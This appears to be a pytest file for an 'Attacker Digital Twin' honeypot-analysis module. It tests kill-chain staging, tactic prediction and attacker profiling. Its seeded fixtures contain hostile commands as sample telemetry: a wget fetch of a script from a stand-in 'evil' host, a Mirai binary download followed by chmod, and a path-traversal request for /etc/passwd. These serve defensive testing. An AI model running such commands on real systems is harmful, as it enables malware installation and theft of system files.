"""Tests for the Attacker Digital Twin (ADT) — Innovation Module 05."""

import time

import pytest

from src.db.fallback_store import FallbackDB
from src.twin import AttackerDigitalTwin, TacticPredictor, build_kill_chain
from src.twin.kill_chain import KILL_CHAIN_STAGES, tactic_for_attack_type


@pytest.fixture
def db(tmp_path):
    database = FallbackDB(str(tmp_path / "twin.db"))
    yield database
    database.close()


def _seed_events(db, src_ip, specs):
    """specs: list of (attack_type, severity, honeypot, command, ts)."""
    for i, (atype, sev, hp, cmd, ts) in enumerate(specs):
        db["alert_events"].insert_one({
            "event_id": f"{src_ip}-{i}", "src_ip": src_ip, "attack_type": atype,
            "severity": sev, "honeypot_source": hp, "command": cmd,
            "timestamp": ts, "extra": {},
        })


# ── kill chain ───────────────────────────────────────────────────────────────────


def test_kill_chain_orders_and_progresses():
    kc = build_kill_chain(["Discovery", "Execution", "Impact"])
    assert kc["current_stage"] == "Actions on Objectives"  # Impact is final
    assert kc["current_index"] == len(KILL_CHAIN_STAGES) - 1
    assert kc["progress"] == 1.0
    assert kc["depth"] == 3
    names = {s["name"] for s in kc["stages"] if s["reached"]}
    assert names == {"Reconnaissance", "Exploitation", "Actions on Objectives"}


def test_kill_chain_empty():
    kc = build_kill_chain([])
    assert kc["progress"] == 0.0
    assert kc["depth"] == 0


def test_attack_type_maps_to_tactic():
    assert tactic_for_attack_type("brute_force") == "Credential Access"
    assert tactic_for_attack_type("command_injection") == "Execution"
    assert tactic_for_attack_type("data_exfiltration") == "Exfiltration"
    assert tactic_for_attack_type("nonsense") == "Discovery"  # safe default


# ── predictor ────────────────────────────────────────────────────────────────────


def test_predict_next_returns_ranked_probabilities():
    preds = TacticPredictor(["Discovery"]).predict_next("Credential Access", top_n=3)
    assert len(preds) == 3
    probs = [p["probability"] for p in preds]
    assert probs == sorted(probs, reverse=True)
    # Credential Access most strongly leads to Lateral Movement in the matrix.
    assert preds[0]["tactic"] == "Lateral Movement"
    assert all("technique_id" in p and "kill_chain_stage" in p for p in preds)


def test_simulation_is_deterministic_for_seed():
    p = TacticPredictor(["Discovery"])
    a = p.simulate_forward("Discovery", steps=6, seed=7)
    b = p.simulate_forward("Discovery", steps=6, seed=7)
    assert [s["tactic"] for s in a] == [s["tactic"] for s in b]
    assert len(a) == 6
    assert all(s["step"] == i + 1 for i, s in enumerate(a))


def test_observed_transitions_personalise_prediction():
    # An attacker who always goes Discovery→Impact should skew toward Impact.
    seq = ["Discovery", "Impact", "Discovery", "Impact", "Discovery"]
    preds = TacticPredictor(seq, learn_weight=0.8).predict_next("Discovery", top_n=3)
    tactics = [p["tactic"] for p in preds]
    assert "Impact" in tactics


# ── twin engine ──────────────────────────────────────────────────────────────────


def test_build_twin_from_honeypot_events(db):
    now = time.time()
    _seed_events(db, "1.2.3.4", [
        ("tool_fingerprint", "low", "ssh", "ssh_connect", now),
        ("brute_force", "medium", "ssh", "ssh_auth_password", now + 1),
        ("command_injection", "high", "telnet", "wget http://evil/x.sh", now + 2),
        ("data_exfiltration", "high", "http", "GET /../../etc/passwd", now + 3),
    ])
    adt = AttackerDigitalTwin(db)
    twin = adt.build_twin("1.2.3.4")

    assert twin.src_ip == "1.2.3.4"
    assert twin.observation_count == 4
    assert set(twin.honeypots_touched) == {"ssh", "telnet", "http"}
    assert "wget" in twin.tools
    # Discovery + Credential Access + Execution + Exfiltration → reaches final stage
    assert twin.kill_chain["current_stage"] == "Actions on Objectives"
    assert twin.predicted_next and "tactic" in twin.predicted_next[0]
    assert 0.0 <= twin.confidence <= 1.0
    assert twin.recommendation["anticipated_tactic"]


def test_twin_detects_automation_from_tooling(db):
    now = time.time()
    _seed_events(db, "9.9.9.9", [
        ("tool_fingerprint", "low", "telnet", "/bin/busybox MIRAI", now),
        ("command_injection", "high", "telnet", "wget http://x/mirai.arm7", now + 0.2),
        ("command_injection", "high", "telnet", "chmod 777 mirai.arm7", now + 0.4),
    ])
    twin = AttackerDigitalTwin(db).build_twin("9.9.9.9")
    assert "Mirai" in twin.tools or "BusyBox" in twin.tools
    assert twin.automation_score >= 50


def test_twin_persists_and_lists(db):
    _seed_events(db, "5.5.5.5", [("brute_force", "medium", "ftp", "PASS", time.time())])
    adt = AttackerDigitalTwin(db)
    adt.build_twin("5.5.5.5")
    assert adt.get_twin("5.5.5.5") is not None
    twins = adt.list_twins()
    assert any(t["src_ip"] == "5.5.5.5" for t in twins)


def test_twin_merges_profile_and_psychology(db):
    now = time.time()
    _seed_events(db, "7.7.7.7", [("tool_fingerprint", "low", "ssh", "ssh_connect", now)])
    db["attacker_profiles"].insert_one({
        "src_ip": "7.7.7.7", "attacker_tier": "advanced_human",
        "classified_intent": "lateral_movement", "threat_score": 88.0,
        "ttps": [{"technique_id": "T1021.004", "tactic": "Lateral Movement"}],
    })
    db["cbee_profiles"].insert_one({
        "src_ip": "7.7.7.7", "dominant": "authority_signal", "overall": 70.0,
    })
    twin = AttackerDigitalTwin(db).build_twin("7.7.7.7")
    assert twin.attacker_tier == "advanced_human"
    assert twin.classified_intent == "lateral_movement"
    assert twin.threat_score >= 88.0
    assert "Lateral Movement" in twin.tactics_observed
    assert twin.psychology.get("dominant") == "authority_signal"


def test_simulate_via_engine_is_stable(db):
    _seed_events(db, "8.8.8.8", [
        ("brute_force", "medium", "ssh", "auth", time.time()),
        ("command_injection", "high", "ssh", "wget x", time.time() + 1),
    ])
    adt = AttackerDigitalTwin(db)
    twin = adt.build_twin("8.8.8.8")
    f1 = adt.simulate(twin, steps=5)
    f2 = adt.simulate(twin, steps=5)
    assert [s["tactic"] for s in f1] == [s["tactic"] for s in f2]  # per-twin stable seed
